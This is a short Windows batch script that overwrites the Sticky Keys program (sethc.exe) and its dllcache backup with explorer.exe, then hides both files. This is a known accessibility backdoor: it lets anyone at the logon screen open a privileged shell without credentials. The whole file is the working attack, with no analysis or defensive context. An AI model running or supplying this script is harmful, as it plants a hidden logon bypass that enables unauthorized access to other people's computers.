@echo off
copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
attrib c:\windows\system32\sethc.exe +h
attrib c:\windows\system32\dllcache\sethc.exe +h
echo. & pause
Exit